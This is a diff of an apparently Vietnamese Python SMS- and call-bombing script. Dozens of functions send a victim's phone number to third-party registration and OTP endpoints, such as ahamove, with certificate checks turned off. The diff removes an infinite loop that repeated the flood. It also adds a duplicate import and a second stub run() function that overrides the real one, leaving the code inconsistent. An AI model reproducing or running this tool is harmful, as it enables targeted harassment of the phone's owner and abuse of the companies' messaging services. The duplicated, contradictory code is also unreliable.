@@ -2007,7 +2007,10 @@ def sms44(phone):
     Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"cocailondjtcmm12@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
     Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers, timeout=30, verify=False)
 
+import sys, re
+
 def run(phone):
+    print(f"Đang chạy với số {phone}")
     sms0(phone); print("Bắt đầu sms0")
     sms1(phone); print("Bắt đầu sms1")
     sms2(phone); print("Bắt đầu sms2")
@@ -2081,6 +2084,12 @@ def run(phone):
     time.sleep(5)
     call7(phone); print("Bắt đầu call7")
 
+import sys, re
+
+def run(phone):
+    print(f"Đang chạy với số {phone}")
+    # logic xử lý ở đây
+
 def chay():
     if len(sys.argv) < 2:
         print("Vui lòng truyền số điện thoại làm tham số dòng lệnh.")
@@ -2093,9 +2102,7 @@ def chay():
         print("Số điện thoại không hợp lệ.")
         sys.exit(1)
     
-    run(phone)  # Gọi hàm run với số điện thoại
+    run(phone)  # chạy 1 lần thôi
+
 if __name__ == "__main__":
     chay()
-    hoang = 0
-    while hoang == 0:
-        run(phone)
